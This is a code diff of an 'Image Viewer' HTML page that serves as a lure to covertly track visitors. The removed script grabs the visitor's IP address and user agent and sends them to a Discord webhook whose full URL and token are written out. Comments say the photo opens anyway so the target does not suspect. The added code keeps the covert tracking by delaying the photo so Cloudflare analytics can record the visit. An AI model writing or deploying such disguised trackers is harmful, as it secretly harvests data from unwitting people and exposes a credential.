@@ -3,31 +3,16 @@
 <head>
     <title>Image Viewer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Cloudflare Web Analytics -->
+    <script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "f344dd54cd5b4013aad2abf0877167e9"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
     <script>
-        // अपडेटेड URL जो 100% सही JSON डेटा देता है
-        fetch('https://ipify.org')
-        .then(response => response.json())
-        .then(data => {
-            const webhookURL = "https://discord.com/api/webhooks/1546246221717442701/Xdm1gPMdRG-E90lbS6ytawkRQo4vJthOWKxgGSJGAOeBYuMqF0cPGqIgqQOHYN-uA-OS"; 
-            
-            const payload = {
-                content: `🚨 **SUSPECT TRACKED!** 🚨\n🌐 **IP Address:** ${data.ip}\n📱 **Device/User-Agent:** ${navigator.userAgent}\n⏰ **Time:** ${new Date().toLocaleString()}`
-            };
-            
-            return fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        })
-        .then(() => {
-            // डिस्कोर्ड पर मैसेज जाने के बाद फोटो खुलेगी
-            window.location.href = "photo.jpg"; 
-        })
-        .catch((err) => {
-            // बैकएंड एरर होने पर भी अपराधी को शक न हो, इसलिए फोटो फिर भी खुलेगी
+        // क्लाउडफ्लेयर को डेटा रिकॉर्ड करने के लिए 1.5 सेकंड का समय देने के बाद फोटो लोड होगी
+        setTimeout(function() {
             window.location.href = "photo.jpg";
-        });
+        }, 1500);
     </script>
 </head>
 <body style="background-color: black; margin: 0; padding: 0;">
